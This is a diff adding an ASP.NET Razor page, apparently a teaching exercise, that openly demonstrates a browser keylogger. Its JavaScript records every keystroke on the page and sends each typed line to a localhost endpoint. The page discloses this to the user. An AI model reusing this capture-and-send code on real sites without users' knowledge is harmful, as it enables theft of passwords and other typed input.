@@ -1,0 +1,65 @@
+﻿
+@{
+    ViewBag.Title = "KeyLogger";
+}
+
+<h2>KeyLogger</h2>
+
+<p>
+    Alles was auf dieser Seite in der Tastatur eingegeben wird, wird in der Javascript Konsole ausgegeben.
+    Die letzte getipte Zeile wird auf der Index Seite ausgegeben (refresh erforderlich).
+</p>
+
+<script type="text/javascript" charset="utf-8">
+
+        ///Aufgabe01
+
+        var word = "";
+        var sentence = "";
+        var line = "";
+
+        document.addEventListener("keydown", function (e) {
+
+            var characterCode = e.which || e.keyCode;
+            var characterValue = String.fromCharCode(characterCode);
+
+            console.log("char: " + characterValue);
+
+            switch (characterCode) {
+                case 32:
+                    sentence += " " + word;
+                    console.log("word: " + word);
+                    word = "";
+                    break;
+                case 13 || 190:
+                    line += sentence + word;
+
+                    console.log("line: " + line);
+
+                    SendLine(line);
+
+                    word = "";
+                    sentence = "";
+                    line = "";
+                    break;
+                case 8:
+                    word += "{backspace}";
+                    break;
+                default:
+                    word += characterValue;
+                    break;
+            }
+
+        });
+
+        function SendLine(line)
+        {
+            if (line.length > 0) {
+                const httpRequest = new XMLHttpRequest();
+
+                //gibt manchmal eine Fehlermeldung, hat beim testen aber trotzdem funktioniert
+                httpRequest.open("GET", "http://localhost:49815/Home/GetKeyLoggerLine?line=" + line);
+                httpRequest.send();
+            }
+        }
+</script>
